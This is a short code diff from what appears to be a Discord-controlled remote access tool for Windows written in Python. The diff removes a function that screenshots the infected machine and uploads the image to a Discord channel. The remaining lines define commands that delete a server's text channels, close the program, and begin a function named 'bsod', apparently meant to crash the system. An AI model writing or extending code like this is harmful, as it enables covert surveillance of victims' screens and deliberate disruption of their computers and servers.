@@ -1,6 +1,5 @@
 import pyautogui, os, discord,subprocess,sys,pyttsx3,threading,shutil,webbrowser,psutil,time,asyncio,win32net,ctypes;from ctypes import windll;import winreg,win32file,win32con;import winreg as reg;bots=bots
 import GPUtil,cpuinfo,socket,platform,random,string,rotatescreen
-async def takepic(ctx):pyautogui.screenshot("pic.png").save("pic.png");await ctx.send(file=discord.File("pic.png"));os.remove("pic.png")
 async def clean(ctx):[await channel.delete() for channel in ctx.guild.text_channels if channel != ctx.channel]
 async def close(ctx): await ctx.send("closing..."); sys.exit() if not sys.exc_info()[0] else None
 async def bsod(ctx):
